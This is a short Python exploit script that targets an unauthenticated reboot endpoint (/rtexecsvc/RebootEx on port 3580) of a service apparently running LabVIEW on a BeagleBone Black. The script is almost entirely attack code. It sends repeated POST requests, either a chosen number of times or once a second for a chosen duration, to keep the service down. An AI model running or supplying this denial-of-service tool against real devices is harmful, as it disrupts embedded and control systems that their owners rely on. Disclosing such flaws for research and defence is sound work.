import requests
import argparse
import time

'''
This exploit leverages the fact that the service NiSysServer.py, running on port number 3580 is open to internet. There is no form of basic authentication implemened on this service which is exposing the endpoint /rtexecsvc/RebootEx
Once an attacker knows that the service is running, he simply needs to send a POST request to this endpoint to restart it.
In this script I have demonstrated how we can send multiple requests to reset the service that can persistently block the labview.service running on the BBB.
'''


parser = argparse.ArgumentParser()
parser.add_argument('-c ','--count',dest="count", help="Number of Requests you want to send to DOS")
parser.add_argument('target',help="Set the address of target BBB host")
parser.add_argument('-p','--port', dest="port",help="Set the address of port", default="3580")
parser.add_argument('-d','--duration',dest="duration",help="The duration for which the exploit should persist")
args = parser.parse_args()



url = "http://"+args.target+":"+args.port+"/rtexecsvc/RebootEx"
headers = {"User-Agent": "insomnia/7.1.1", "Accept": "*/*", "Connection": "close"}

# Assuming count is positive
if args.count is not None:
	print("Sending %d requests"%int(args.count))
	for i in range(1,int(args.count)+1):
		print(i)
		requests.post(url, headers=headers)

if args.duration is not None:
	print("Making the server sleep for %d seconds"%int(args.duration))
	for i in range(1,int(args.duration)+1):
		requests.post(url, headers=headers)
		time.sleep(1)
